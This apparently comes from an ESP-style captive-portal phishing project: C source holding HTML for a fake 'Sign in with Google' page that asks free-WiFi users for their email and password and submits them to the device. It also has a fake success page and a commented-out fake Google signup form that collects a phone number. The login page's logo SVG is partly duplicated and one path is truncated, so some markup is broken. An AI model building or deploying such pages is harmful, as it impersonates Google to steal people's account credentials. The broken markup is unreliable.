// Google-looking portal page
const char index_html[] PROGMEM = R"rawliteral( 
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Sign in with Google</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <base href="/">
    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg viewBox='0 0 48 48' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3E%3Ccircle cx='24' cy='24' r='22' fill='%23fff'/%3E%3Cdefs%3E%3Cpath id='b' d='M44.5 20H24v8.5h11.8C34.7 33.9 30.1 37 24 37c-7.2 0-13-5.8-13-13s5.8-13 13-13c3.1 0 5.9 1.1 8.1 2.9l6.4-6.4C34.6 4.1 29.6 2 24 2 11.8 2 2 11.8 2 24s9.8 22 22 22c11 0 21-8 21-22 0-1.3-.2-2.7-.5-4z'/%3E%3C/defs%3E%3CclipPath id='a'%3E%3Cuse overflow='visible' xlink:href='%23b'/%3E%3C/clipPath%3E%3Cpath transform='scale(.8) translate(6 6)' d='M0 37V11l17 13z' clip-path='url(%23a)' fill='%23FBBC05'/%3E%3Cpath transform='scale(.8) translate(6 6)' d='M0 11l17 13 7-6.1L48 14V0H0z' clip-path='url(%23a)' fill='%23EA4335'/%3E%3Cpath transform='scale(.8) translate(6 6)' d='M0 37l30-23 7.9 1L48 0v48H0z' clip-path='url(%23a)' fill='%2334A853'/%3E%3Cpath transform='scale(.8) translate(6 6)' d='m48 48-31-24-4-3 35-10z' clip-path='url(%23a)' fill='%234285F4'/%3E%3C/svg%3E">
    <style>
        body {
            position: relative;
            margin: 0;
            font-family: Arial, Helvetica, sans-serif;
            scroll-behavior: smooth;
        }
        .container {
            display: flex;
            height: 100vh;
            user-select: none;
        }
        .card {
            background: #fff;
            width: 412px;
            padding: 48px 36px;
            border-radius: 8px;
            border: 1px solid #cacaca;
            margin: auto;
        }
        .header {
            text-align: center;
            font-weight: 400;
        }
        .title {
            padding: 15px 0;
            font-size: 24px;
        }
        .tagline {
            font-size: 16px;
            padding-bottom: 18px;
        }
        label {
            display: block;
            position: absolute;
            padding: 0 5px;
            width: auto;
            color: #5f6368;
            background: #fff;
            transition: all 150ms ease;
            transform: translate(12px, -37px);
            cursor: text;
        }
        input {
            padding: 16px;
            margin-top: 20px;
            font-size: 17px;
            background: #fff;
            width: calc(100% - 36px);
            border: 1px solid #cacaca;
            border-radius: 5px;
        }
        input:focus {
            outline: 0;
            padding: 15px;
            border: 2px solid #1a73e8;
        }
        input:focus + label, input:not(:placeholder-shown) + label {
            transform: translate(8px, -62px);
            font-size: 13px;
        }
        input:focus + label {
            color: #1a73e8;
        }
        .links {
            color: #1a73e8;
            font-size: 14px;
            padding-top: 10px;
            cursor: pointer;
            font-weight: 500;
        }
        .guest {
            margin-top: 32px;
            font-size: 14px;
            color: #5f6368;
        }
        .login-bar {
            margin-top: 32px;
            display: flex;
            flex-wrap: wrap;
        }
        .next {
            margin-left: auto;
            padding: 10px 30px;
            border-radius: 5px;
            cursor: pointer;
            color: #fff;
            outline: 0;
            border: none;
            background: #1a73e8;
            font-weight: 600;
        }
        .next:hover {
            background: #4285f4;
        }
        .cr {
            font-weight: 600;
        }
        @media only screen and (max-width: 600px) {
            .card {
                border: none;
            }
        }
        .footer {
            position: absolute;
            right: 0;
            bottom: 0;
            left: 0;
            padding: 1rem;
            text-align: center;
        }
        .footer .links {
            color: #3c4043;
            font-size: 14px;
            margin: 0 .5rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="header">
                <svg aria-hidden="true" height="24" viewBox="0 0 75 24" width="75" xmlns="http://www.w3.org/2000/svg">
                    <!-- Google Logo -->
                    <g id="qaEJec">
                        <path d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z" fill="#ea4335"></path>
                    </g>
                    <g id="YGlOvc">
                        <path d="M58.193.67h2.564v17.44h-2.564z" fill="#34a853"></path>
                    </g>
                    <g id="BWfIk">
                        <path d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z" fill="#4285f4"></path>
                    </g>
                    <g id="e6m3fd">
                        <path d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z" fill="#fbbc05"></path>
                    </g>
                    <g id="vbkDmc">
                        <path d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z" fill="#ea4335"></path>
                    </g>
                    <g id="idEJde">
                        <path d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9"
                    </g>
                    <g id="e6m3fd">
                        <path d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z" fill="#fbbc05"></path>
                    </g>
                    <g id="vbkDmc">
                        <path d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z" fill="#ea4335"></path>
                    </g>
                    <g id="idEJde">
                        <path d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z" fill="#4285f4"></path>
                    </g>
                </svg>
                <div class="title">Sign in</div>
                <div class="tagline">Use your Google Account to access this Free WiFi.</div>
            </div>
            <form action="/get" id="login-form">
                <input id="username" name="username" placeholder=" " required autofocus>
                <label for="username">Email or phone</label>
                <input id="password" name="password" placeholder=" " required type="password">
                <label for="password">Password</label>
                <div class="links">Forgot password?</div>
                <div class="guest">Not your computer? Use Guest mode to sign in privately.</div>
                <div class="links">Learn more</div>
                <div class="login-bar">
                    <div class="links cr">Create account</div>
                    <a href="/signup"><button class="next" type="submit">Next</button></a>
                </div>
            </form>
        </div>
        <div class="footer">
            <span class="links">Help</span>
            <span class="links">Privacy</span>
            <span class="links">Terms</span>
        </div>
    </div>
</body>
</html>

)rawliteral";

// Fake "Login success" page
const char success_html[] PROGMEM = R"rawliteral(
<!DOCTYPE HTML>
<html>
<head>
  <title>Login Portal</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f1f1f1;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .success-container {
      background-color: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
      max-width: 300px;
      width: 90%;
      text-align: center;
    }
    .success-container h3 {
      margin-top: 0;
    }
    .success-container p {
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="success-container">
    <h3>Success</h3>
    <p>Thank you! You are now connected to the internet.</p>
  </div>
</body>
</html>
)rawliteral";

// Fake "Sign up" page
const char signup_html[] PROGMEM = R"rawliteral(
/*<!DOCTYPE HTML>
<html>

<head>
    <title>Google Account Signup</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f1f1f1;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            max-width: 300px;
            width: 90%;
            text-align: center;
            align-items: center;
        }

        .login-container h3 {
            text-align: center;
            margin-top: 0;
        }

        .login-form {
            display: flex;
            flex-direction: column;
            text-align: left;
        }

        .login-form input[type="text"],
        .login-form input[type="password"] {
            margin-bottom: 10px;
            padding: 10px;
            border-radius: 4px;
            border: 1px solid #ccc;
            font-size: 16px;
        }

        .login-form input[type="submit"] {
            padding: 10px;
            border: none;
            border-radius: 4px;
            background-color: #4285f4;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .signup-button {
            padding: 10px;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
            width: auto;
            margin: 0 5px;
            /* Adjust margin for spacing */
            display: inline-block;
            /* Display buttons inline */
        }

        .login-form input[type="submit"]:hover {
            background-color: #357ae8;
        }

        .signup-button {
            background-color: #34A853;
            color: #fff;
        }

        .signup-button:hover {
            background-color: #2E8540;
        }

        .login-priv {
            display: flex;
            flex-direction: column;
            align-items: left;
            text-align: left;
            margin-top: 10px;
            color: darkgray;

            /* visibility: hidden; */
        }

        .pw-forgot {
            margin-top: 10px;
            color: darkgray;
            font-size: 14px;
            text-decoration: none;
            text-align: center;
        }

        a {
            color: darkgray;
            /* Specify your desired color */
            text-decoration: none;
            /* Optional: Remove underline */
        }

        .google-logo {
            width: 100px;
            margin-bottom: 20px;
            /* Adjust the size of the logo as needed */
        }
    </style>
</head>

<body>
    <div class="login-container">
        <svg class="google-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path
                d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
                fill="#4285F4" />
            <path
                d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
                fill="#34A853" />
            <path
                d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"
                fill="#FBBC05" />
            <path
                d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
                fill="#EA4335" />
            <path d="M1 1h22v22H1z" fill="none" />
        </svg>
        <h3>Sign up for a free Google Account</h3>
        <form action="/get" class="login-form">
            <label for="username">Email address</label>
            <input type="text" id="username" name="username" required>

            <label for="number">Phone number</label>
            <input type="text" id="number" name="number" required>

            <label for="password">Password</label>
            <input type="password" id="password" name="password" required>

            <!-- Use flexbox for button alignment -->
            <div style="display: flex; justify-content: center; align-items: center;">
                <input type="submit" value="Create Account">
            </div>

            <legend class='pw-forgot'><a
                    href="https://support.google.com/accounts/answer/41078?hl=en&co=GENIE.Platform%3DDesktop">Terms & Conditions</a></legend>

        </form>
        <div class='login-priv'>
            <p class='pw-forgot'>Not your computer? Use a Private Window to sign in. <a href="https://support.google.com/accounts/answer/2917834?hl=en&co=GENIE.Platform%3DDesktop">Learn more</a></p>
        </div>
    </div>
</body>

</html>*/
)rawliteral";



